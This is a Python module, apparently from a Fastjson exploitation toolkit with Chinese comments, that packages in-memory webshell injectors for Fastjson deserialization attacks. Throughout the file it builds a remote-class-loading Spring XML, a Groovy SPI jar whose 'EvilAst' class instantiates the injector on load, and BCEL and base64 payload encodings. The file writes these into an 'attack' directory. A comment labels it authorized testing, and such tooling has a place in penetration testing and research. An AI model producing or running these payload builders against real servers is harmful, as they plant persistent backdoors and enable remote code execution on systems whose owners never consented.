"""把 MemShellParty injector 适配到各 Fastjson 投递点。"""

from __future__ import annotations

import base64
import io
import tempfile
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional
from xml.sax.saxutils import escape

from fastjson_toolkit.poc.echo.assets import _compile_groovy_stubs, _cp_join
from fastjson_toolkit.poc.echo.compile import compile_java_source
from fastjson_toolkit.poc.memshell.models import MemShellResult


@dataclass(frozen=True)
class MemShellDelivery:
    """投递产物。"""

    result: MemShellResult
    class_bytes: bytes
    class_b64: str
    bcel_code: str
    jar_bytes: bytes
    spring_xml_bytes: bytes
    groovy_jar_bytes: Optional[bytes] = None
    notes: tuple[str, ...] = ()


def injector_jar_bytes(result: MemShellResult) -> bytes:
    """单 class jar（Spring XML URLClassLoader 用）。"""
    raw = base64.b64decode(result.injector_b64)
    entry = result.injector_class.replace(".", "/") + ".class"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(entry, raw)
    return buf.getvalue()


def build_spring_memshell_xml(*, jar_url: str, class_name: str) -> bytes:
    """Spring XML：远程加载 injector jar 并 newInstance。"""
    url = escape(jar_url.strip())
    cn = escape(class_name.strip())
    xml = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <!-- 授权测试：远程加载 MemShellParty injector 并实例化 -->
    <bean id="cl" class="java.net.URLClassLoader">
        <constructor-arg>
            <list>
                <value>{url}</value>
            </list>
        </constructor-arg>
        <constructor-arg>
            <bean class="org.springframework.util.ClassUtils" factory-method="getDefaultClassLoader"/>
        </constructor-arg>
    </bean>
    <bean id="msClz" class="java.lang.Class" factory-bean="cl" factory-method="loadClass">
        <constructor-arg value="{cn}"/>
    </bean>
    <bean class="java.lang.Object" factory-bean="msClz" factory-method="newInstance"/>
</beans>
"""
    return xml.encode("utf-8")


def build_groovy_memshell_jar(result: MemShellResult) -> bytes:
    """Groovy SPI jar：静态块 Class.forName + newInstance injector。"""
    inj = result.injector_class
    evil_src = f"""\
package fj1280;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class EvilAst implements ASTTransformation {{
    static {{
        try {{
            Class.forName("{inj}").getDeclaredConstructor().newInstance();
        }} catch (Throwable ignore) {{
        }}
    }}

    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) {{
    }}
}}
"""
    inj_bytes = base64.b64decode(result.injector_b64)
    with tempfile.TemporaryDirectory(prefix="fj-groovy-ms-") as td:
        root = Path(td)
        stub_cp = _compile_groovy_stubs(root / "stubs")
        inj_dir = root / "inj_classes"
        class_path = inj_dir.joinpath(*inj.split(".")).with_suffix(".class")
        class_path.parent.mkdir(parents=True, exist_ok=True)
        class_path.write_bytes(inj_bytes)

        evil_bytes = compile_java_source(
            evil_src,
            "EvilAst",
            classpath=_cp_join(stub_cp, str(inj_dir)),
            out_dir=root / "evil_out",
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(inj.replace(".", "/") + ".class", inj_bytes)
            zf.writestr("fj1280/EvilAst.class", evil_bytes)
            zf.writestr(
                "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
                "fj1280.EvilAst\n",
            )
        return buf.getvalue()


def build_memshell_delivery(
    result: MemShellResult,
    *,
    jar_url: str = "http://127.0.0.1:18080/attack/memshell.jar",
    include_groovy: bool = False,
) -> MemShellDelivery:
    """从生成结果产出 class_b64 / BCEL / jar / Spring XML（及可选 Groovy jar）。"""
    # 延迟导入，避免 memshell ↔ v1_2_47 包循环
    from fastjson_toolkit.poc.v1_2_47.encode import (  # noqa: PLC0415
        bcel_code_from_class_bytes,
    )

    raw = base64.b64decode(result.injector_b64)
    if len(raw) < 4 or raw[:4] != b"\xca\xfe\xba\xbe":
        raise ValueError("injector 不是合法 .class")
    jar = injector_jar_bytes(result)
    xml = build_spring_memshell_xml(jar_url=jar_url, class_name=result.injector_class)
    groovy = build_groovy_memshell_jar(result) if include_groovy else None
    notes = (
        f"injector={result.injector_class} ({result.injector_size} bytes)",
        f"shell={result.shell_class} ({result.shell_size} bytes)",
    )
    return MemShellDelivery(
        result=result,
        class_bytes=raw,
        class_b64=result.injector_b64,
        bcel_code=bcel_code_from_class_bytes(raw),
        jar_bytes=jar,
        spring_xml_bytes=xml,
        groovy_jar_bytes=groovy,
        notes=notes,
    )


def write_spring_memshell_attack_files(
    attack_dir: Path,
    delivery: MemShellDelivery,
    *,
    jar_name: str = "memshell.jar",
    xml_name: str = "bean-memshell.xml",
) -> list[str]:
    """写入 lab attack 目录，返回 notes。"""
    notes: list[str] = []
    attack_dir.mkdir(parents=True, exist_ok=True)
    jar_path = attack_dir / jar_name
    xml_path = attack_dir / xml_name
    jar_path.write_bytes(delivery.jar_bytes)
    xml_path.write_bytes(delivery.spring_xml_bytes)
    notes.append(f"已写入 {jar_path} 与 {xml_path}")
    return notes


def memshell_result_to_info(result: MemShellResult) -> dict[str, Any]:
    """与 16723 runner 历史字段对齐。"""
    return result.as_info_dict()
